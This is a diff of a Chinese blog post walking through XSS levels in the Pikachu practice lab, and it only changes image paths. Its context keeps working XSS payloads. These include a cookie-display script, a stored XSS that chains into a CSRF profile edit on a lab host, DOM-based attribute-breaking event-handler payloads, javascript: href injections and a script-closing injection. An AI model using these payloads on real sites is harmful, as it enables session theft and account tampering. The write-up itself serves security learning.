@@ -33,26 +33,26 @@
 <meta property="og:image" content="https://corsnail.github.io/images/article/20240429/IMG-20240426104205105.png">
 <meta property="og:image" content="https://corsnail.github.io/images/article/20240429/IMG-20240426105338835.png">
 <meta property="og:image" content="https://corsnail.github.io/images/article/20240429/IMG-20240426105514810.png">
-<meta property="og:image" content="https://corsnail.github.io/photo/Pasted%20image%2020240426105652.png">
+<meta property="og:image" content="https://corsnail.github.io/images/article/20240429/Pasted%20image%2020240426105652.png">
 <meta property="og:image" content="https://corsnail.github.io/images/article/20240429/XSS2.gif">
-<meta property="og:image" content="https://corsnail.github.io/photo/Pasted%20image%2020240426110211.png">
+<meta property="og:image" content="https://corsnail.github.io/images/article/20240429/Pasted%20image%2020240426110211.png">
 <meta property="og:image" content="https://corsnail.github.io/images/article/20240429/XSS3.gif">
-<meta property="og:image" content="https://corsnail.github.io/photo/Pasted%20image%2020240426141610.png">
-<meta property="og:image" content="https://corsnail.github.io/photo/Pasted%20image%2020240426141740.png">
-<meta property="og:image" content="https://corsnail.github.io/photo/Pasted%20image%2020240426142246.png">
-<meta property="og:image" content="https://corsnail.github.io/photo/Pasted%20image%2020240426142458.png">
+<meta property="og:image" content="https://corsnail.github.io/images/article/20240429/Pasted%20image%2020240426141610.png">
+<meta property="og:image" content="https://corsnail.github.io/images/article/20240429/Pasted%20image%2020240426141740.png">
+<meta property="og:image" content="https://corsnail.github.io/images/article/20240429/Pasted%20image%2020240426142246.png">
+<meta property="og:image" content="https://corsnail.github.io/images/article/20240429/Pasted%20image%2020240426142458.png">
 <meta property="og:image" content="https://corsnail.github.io/images/article/20240429/XSS4.gif">
-<meta property="og:image" content="https://corsnail.github.io/photo/Pasted%20image%2020240426144024.png">
+<meta property="og:image" content="https://corsnail.github.io/images/article/20240429/Pasted%20image%2020240426144024.png">
 <meta property="og:image" content="https://corsnail.github.io/images/article/20240429/IMG-20240429173210884.png">
 <meta property="og:image" content="https://corsnail.github.io/images/article/20240429/IMG-20240429190156356.png">
 <meta property="og:image" content="https://corsnail.github.io/images/article/20240429/IMG-20240429191947425.png">
 <meta property="og:image" content="https://corsnail.github.io/images/article/20240429/IMG-20240429192909770.png">
-<meta property="og:image" content="https://corsnail.github.io/photo/Pasted%20image%2020240429193045.png">
-<meta property="og:image" content="https://corsnail.github.io/photo/Pasted%20image%2020240429193212.png">
-<meta property="og:image" content="https://corsnail.github.io/photo/Pasted%20image%2020240429193613.png">
-<meta property="og:image" content="https://corsnail.github.io/photo/Pasted%20image%2020240429203613.png">
+<meta property="og:image" content="https://corsnail.github.io/images/article/20240429/Pasted%20image%2020240429193045.png">
+<meta property="og:image" content="https://corsnail.github.io/images/article/20240429/Pasted%20image%2020240429193212.png">
+<meta property="og:image" content="https://corsnail.github.io/images/article/20240429/Pasted%20image%2020240429193613.png">
+<meta property="og:image" content="https://corsnail.github.io/images/article/20240429/Pasted%20image%2020240429203613.png">
 <meta property="article:published_time" content="2024-04-29T13:20:33.000Z">
-<meta property="article:modified_time" content="2024-04-29T13:20:35.788Z">
+<meta property="article:modified_time" content="2024-04-29T13:34:25.818Z">
 <meta property="article:author" content="snail">
 <meta property="article:tag" content="pikachu">
 <meta name="twitter:card" content="summary">
@@ -426,9 +426,9 @@
 <p>但是登录了就不要只想着弹个 xss，尝试弹个 cookie</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p><img src="/images/article/20240429/IMG-20240426105514810.png"><br>成功获取 cookie</p>
-<h1 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h1><p>常见评论，留言板<br><img src="/photo/Pasted%20image%2020240426105652.png"><br>这里就是一个留言板</p>
+<h1 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h1><p>常见评论，留言板<br><img src="/images/article/20240429/Pasted%20image%2020240426105652.png"><br>这里就是一个留言板</p>
 <p><img src="/images/article/20240429/XSS2.gif"><br>插入 xss 之后，每次访问这个界面就会弹 xss，就好像这段代码被插入进去了一样</p>
-<p>试试升级危害<br>我们再次登录 kobe 的 csrf 账号<br><img src="/photo/Pasted%20image%2020240426110211.png"></p>
+<p>试试升级危害<br>我们再次登录 kobe 的 csrf 账号<br><img src="/images/article/20240429/Pasted%20image%2020240426110211.png"></p>
 <p>然后我们往留言板插入下面的 xss</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;XSS&amp;CSRF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=&quot;http://172.17.10.4:8000/vul/csrf/csrfget/csrf_get_edit.php?sex=%E5%A5%B3&amp;phonenum=999999&amp;add=%E6%B4%9B%E6%9D%89%E7%9F%B6&amp;email=manbaout&amp;submit=submit&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
@@ -439,21 +439,21 @@
 <h2 id="普通"><a href="#普通" class="headerlink" title="普通"></a>普通</h2><p>当你输入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/xss/)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/photo/Pasted%20image%2020240426141610.png"><br>当你点击 <code>what do you see?</code> 的时候就会调用一次 alert (&#x2F;xss&#x2F;)</p>
-<p><img src="/photo/Pasted%20image%2020240426141740.png"><br>源码中写了一个 domxss () 的方法，点击 <code>click me!</code> 的时候就会调用这个方法</p>
+<p><img src="/images/article/20240429/Pasted%20image%2020240426141610.png"><br>当你点击 <code>what do you see?</code> 的时候就会调用一次 alert (&#x2F;xss&#x2F;)</p>
+<p><img src="/images/article/20240429/Pasted%20image%2020240426141740.png"><br>源码中写了一个 domxss () 的方法，点击 <code>click me!</code> 的时候就会调用这个方法</p>
 <p>这里方法</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123; </span><br><span class="line"><span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>; <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt; </span></span><br><span class="line"><span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br></pre></td></tr></table></figure>
 
 <p>调用方法不输入时拼接</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>输入 1 的时候<br><img src="/photo/Pasted%20image%2020240426142246.png"></p>
+<p>输入 1 的时候<br><img src="/images/article/20240429/Pasted%20image%2020240426142246.png"></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;1&quot;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>当 payload 为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/photo/Pasted%20image%2020240426142458.png"><br>会把后面的内容注释</p>
+<p><img src="/images/article/20240429/Pasted%20image%2020240426142458.png"><br>会把后面的内容注释</p>
 <p>在方法中是这样的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;a href=&#x27;&quot;+&quot;&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;&quot;+&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span><br></pre></td></tr></table></figure>
 
@@ -465,7 +465,7 @@
 <p>靶场作者还留下了另外的 payload，也可以触发</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<h2 id="xss-x"><a href="#xss-x" class="headerlink" title="xss-x"></a>xss-x</h2><p>输入个 1<br><img src="/photo/Pasted%20image%2020240426144024.png"><br>发现和前面差不多，而且过滤了和没有过滤也没有差别</p>
+<h2 id="xss-x"><a href="#xss-x" class="headerlink" title="xss-x"></a>xss-x</h2><p>输入个 1<br><img src="/images/article/20240429/Pasted%20image%2020240426144024.png"><br>发现和前面差不多，而且过滤了和没有过滤也没有差别</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&#x27;&gt;&lt;img src=&quot;#&quot; onerror=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
 <h1 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h1><h2 id="盲打"><a href="#盲打" class="headerlink" title="盲打"></a>盲打</h2><p>盲打就是看不到源码<br>蒙着眼睛打就行<br>反射型 xss</p>
 <h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><p>过滤了一些东西，<br>测试黑名单：</p>
@@ -486,12 +486,12 @@
 <h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h2><p>特殊的 html 字符？<br><img src="/images/article/20240429/IMG-20240429191947425.png"></p>
 <p><code>specialchars()</code> 是一个特殊函数，他会过滤<strong>单引号</strong>，<strong>双引号</strong>，<strong>尖括号</strong>，但是默认是不过滤单引号的，需要调整某个参数才会过滤</p>
 <p><img src="/images/article/20240429/IMG-20240429192909770.png"><br>会将写入的内容插入到 a 标签的 href 处</p>
-<p><img src="/photo/Pasted%20image%2020240429193045.png"><br>直接 <code>javascript:alert(1)</code> 即可弹窗</p>
-<h2 id="href-输出"><a href="#href-输出" class="headerlink" title="href 输出"></a>href 输出</h2><p><img src="/photo/Pasted%20image%2020240429193212.png"><br>和刚才很像，不过这里是没有 <code>specialchars()</code> 函数</p>
+<p><img src="/images/article/20240429/Pasted%20image%2020240429193045.png"><br>直接 <code>javascript:alert(1)</code> 即可弹窗</p>
+<h2 id="href-输出"><a href="#href-输出" class="headerlink" title="href 输出"></a>href 输出</h2><p><img src="/images/article/20240429/Pasted%20image%2020240429193212.png"><br>和刚才很像，不过这里是没有 <code>specialchars()</code> 函数</p>
 <p>刚才的 payload 即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br><span class="line">q&#x27; onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/photo/Pasted%20image%2020240429193613.png"><br>成功弹窗</p>
-<h2 id="js-输出"><a href="#js-输出" class="headerlink" title="js 输出"></a>js 输出</h2><p><img src="/photo/Pasted%20image%2020240429203613.png"></p>
+<p><img src="/images/article/20240429/Pasted%20image%2020240429193613.png"><br>成功弹窗</p>
+<h2 id="js-输出"><a href="#js-输出" class="headerlink" title="js 输出"></a>js 输出</h2><p><img src="/images/article/20240429/Pasted%20image%2020240429203613.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;/script&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; # 先把前面的闭合再插入自己的语句</span><br></pre></td></tr></table></figure>
 
 
